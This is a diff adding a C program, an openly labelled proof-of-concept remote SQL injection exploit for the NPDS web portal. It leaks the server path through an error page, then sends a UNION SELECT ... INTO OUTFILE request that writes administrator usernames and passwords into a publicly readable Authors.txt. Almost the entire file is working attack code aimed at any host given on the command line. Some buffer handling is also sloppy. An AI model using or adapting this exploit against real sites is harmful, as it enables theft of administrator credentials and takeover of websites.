@@ -1,0 +1,151 @@
+#include<string.h>
+#include<netdb.h>
+#include<stdio.h>
+#include<stdlib.h>
+#include<sys/types.h>
+#include<sys/socket.h>
+#include<netinet/in.h>
+
+
+/*Port HTTP*/
+#define PORT 80
+
+#define MAXLEN 4096
+
+main(int argc, char *argv[]){
+
+if ((argc != 2) || (strlen(argv[1])>=256))
+{
+printf( "\n");
+printf( "-----------------------------------------------------------------\n");
+printf( " Xploit_NPDS-Narval\n");
+printf( " NPDS Remote SQL Injection Proof of concept\n");
+printf( " Vulnerability discovered && Exploit coded by \n");
+printf( " Romano <romano_45_at_hotmail_dot_com> &&\n");
+printf( " NoSP <NoSP_at_thehackademy_dot_net>\n");
+printf( " Usage: ./Xploit_npds_5.0 <server> or <ip>\n");
+printf( " ex : ./Xploit_npds_5.0 127.0.0.1 or\n");
+printf( "      ./Xploit_npds_5.0 localhost or\n");
+printf( "      ./Xploit_npds_5.0 www.site.com/npds\n");
+printf( "-----------------------------------------------------------------\n");
+exit(1);
+}
+
+/*define variable*/
+
+int fd;
+
+char *fin_cut;
+char *deb_cut;
+char dossier[512];
+char path_disclosure[4096];
+char recept[1024];
+char path[2048];
+char sql_inject[4096];
+char envoi[]="non";
+
+/*Decoupage si npds n'est pas ? la racine*/
+if(strstr(argv[1],"/")){
+        deb_cut=strstr(argv[1],"/")+strlen("/");
+        strncpy(dossier,"/",strlen("/"));
+        strncat(dossier,deb_cut,strlen(deb_cut));
+        strncat(dossier,"/",strlen("/"));
+        /*On coupe le nom de domaine*/
+        fin_cut=strstr(argv[1],"/");
+        *fin_cut='\0';
+
+}else{
+        strncpy(dossier,"/",strlen("/"));
+}
+
+
+/*Cr?ation de la socket*/
+if((fd=socket(AF_INET,SOCK_STREAM,0))==1 ){
+perror("Impossible de se connecter au serveur. V?rifiez l'adresse, elle doit ?tre sous la forme 159.125.45.21 ou www.site.com");
+        exit(EXIT_FAILURE);}
+
+/*Define structure sockaddr_in*/
+struct sockaddr_in addr;
+addr.sin_family=AF_INET;
+addr.sin_port=htons(PORT);
+addr.sin_addr.s_addr=inet_addr(argv[1]);
+memset(&(addr.sin_zero),'\0',8);
+
+
+
+/*Connexion et ?ventuellement r?solution de nom de domaine*/
+if( addr.sin_addr.s_addr!=-1){
+        if(connect(fd,(struct sock_addr *)&addr,sizeof(struct sockaddr))==-1){
+        perror("Impossible de se connecter au serveur. V?rifiez l'adresse, elle doit ?tre sous la forme 159.125.45.21 ou www.site.com");
+        exit(EXIT_FAILURE);
+        }
+        }else{
+
+/*r?solution de nom de domaine*/
+        struct hostent *hp;
+        if(hp=gethostbyname(argv[1])){
+        bcopy( (char *) hp->h_addr_list[0],(char *)&(addr.sin_addr),sizeof(addr.sin_addr) );
+        if(connect(fd,(struct sock_addr *)&addr,sizeof(struct sockaddr))==-1){
+        perror("Impossible de se connecter au serveur. V?rifiez l'adresse, elle doit ?tre sous la forme 159.125.45.21 ou www.site.com");
+        exit(EXIT_FAILURE);
+        }
+        }else{ printf("D?sol?, nom de domaine introuvable\n");exit(1);}
+        }
+
+/*On cr?e la requ?te dans la variable path_disclosure qui va nous servir ? r?cup?rer le $PATH du site*/
+        strncpy(path_disclosure,"GET ",strlen("GET "));
+        strncat(path_disclosure,dossier,strlen(dossier));
+        strncat(path_disclosure,"modules/links/admin/links.php HTTP/1.1\r\nHost: ",strlen("modules/links/admin/links.php HTTP/1.1\r\nHost: "));
+        strncat(path_disclosure,argv[1],strlen(argv[1]));
+        strncat(path_disclosure,"\r\nConnection: Keep-Alive\r\n\n",strlen("\r\nConnection: Keep-Alive\r\n\n\0"));
+/*Et on l'envoie*/
+        if(send(fd,path_disclosure,strlen(path_disclosure),0)){printf("Recherche de $PATH du site.....\n");}
+
+/*reception et traitement des messages*/
+while(recv(fd,recept,1024,0)){
+
+        /*R?cup?ration du $PATH & fabrication de la requ?te*/
+                if(strstr(recept,"_error() in <b>") && strstr(recept,"/modules/")){
+                        deb_cut=strstr(recept,"_error() in <b>")+strlen("_error() in <b>");
+                        fin_cut=strstr(recept,"modules/");
+                        *fin_cut='\0';
+                        strncpy(path,deb_cut,strlen(deb_cut));
+printf("$PATH r?cup?r?.................\n%s\n",path);
+strncpy(envoi,"oui",strlen("oui"));
+                }else{
+                printf("D?sol?, impossible de r?cup?rer le $PATH\n");
+                exit(1);
+                }
+
+                if(strstr(envoi,"oui")){
+        /*On cr?e la requ?te dans la variable sql_inject qui va nous permettre de cr?er le fichier Authors.txt contenant les pass admin*/
+                        strncpy(sql_inject,"GET ",strlen("GET "));
+                        strncat(sql_inject,dossier,strlen(dossier));
+
+strncat(sql_inject,"/links.php?op=search&query=test%20'%20UNION%20SELECT%200,aid,pwd,0,0,0,0,0%20FROM%20authors%20where%20aid%3C%3E''%20INTO%20OUTFILE%20'",strlen("/links
+.php?op=search&query=test%20'%20UNION%20SELECT%200,aid,pwd,0,0,0,0,0%20FROM%20authors%20where%20aid%3C%3E''%20INTO%20OUTFILE%20'"));
+                        strncat(sql_inject,path,strlen(path));
+                        strncat(sql_inject,"Authors.txt'/* HTTP/1.1\r\nHost: ",strlen("Authors.txt'/* HTTP/1.1\r\nHost: "));
+                        strncat(sql_inject,argv[1],strlen(argv[1]));
+                        strncat(sql_inject,"\r\nConnection: Keep-Alive\r\n\n\0",strlen("\r\nConnection: Keep-Alive\r\n\n\0"));
+
+        /*Et on l'envoie au site, cr?ant ainsi le fichier Authors.txt*/
+                                if(send(fd,sql_inject,strlen(sql_inject),0)){
+                                        printf("SQL Injection..................\nCr?ation du fichier http://%s%sAuthors.txt\n",argv[1],dossier);
+                                        exit(1);
+                                }else{
+                                printf("D?sol? impossible de cr?er le fichier\n");
+                                exit(1);
+                                }
+                }
+
+bzero(recept,MAXLEN);
+bzero(path,MAXLEN);
+bzero(sql_inject,MAXLEN);
+bzero(path_disclosure,MAXLEN);
+}
+
+close(fd);
+return 0;
+}
+
